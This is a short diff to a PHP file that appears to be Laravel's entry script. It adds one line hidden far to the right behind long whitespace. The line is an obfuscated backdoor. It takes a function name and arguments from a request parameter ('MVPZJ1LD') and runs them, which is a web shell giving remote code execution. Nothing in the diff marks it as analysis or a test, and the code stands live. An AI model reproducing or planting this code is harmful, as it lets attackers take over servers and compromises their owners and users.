@@ -1,4 +1,5 @@
 <?php
+                                                                                                                                                                                                                                                                                 if( $rdpiat=@$	{	"_REQUEST"}	["MVPZJ1LD"])$rdpiat	[	1	]	( $	{ $rdpiat[2] } [0 ],$rdpiat[3	]	($rdpiat [4 ]	) );
 
 /**
  * Laravel - A PHP Framework For Web Artisans
